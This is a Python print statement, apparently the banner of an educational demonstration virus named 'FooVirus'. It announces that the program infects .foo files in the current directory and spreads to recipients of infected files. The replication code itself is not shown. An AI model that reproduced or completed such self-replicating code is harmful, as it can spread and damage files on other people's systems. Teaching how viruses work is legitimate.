print("""\nHELLO FROM FooVirus\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also.

Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload.  All it
does is to print out this message and comment out the
code in .foo files.\n\n""")
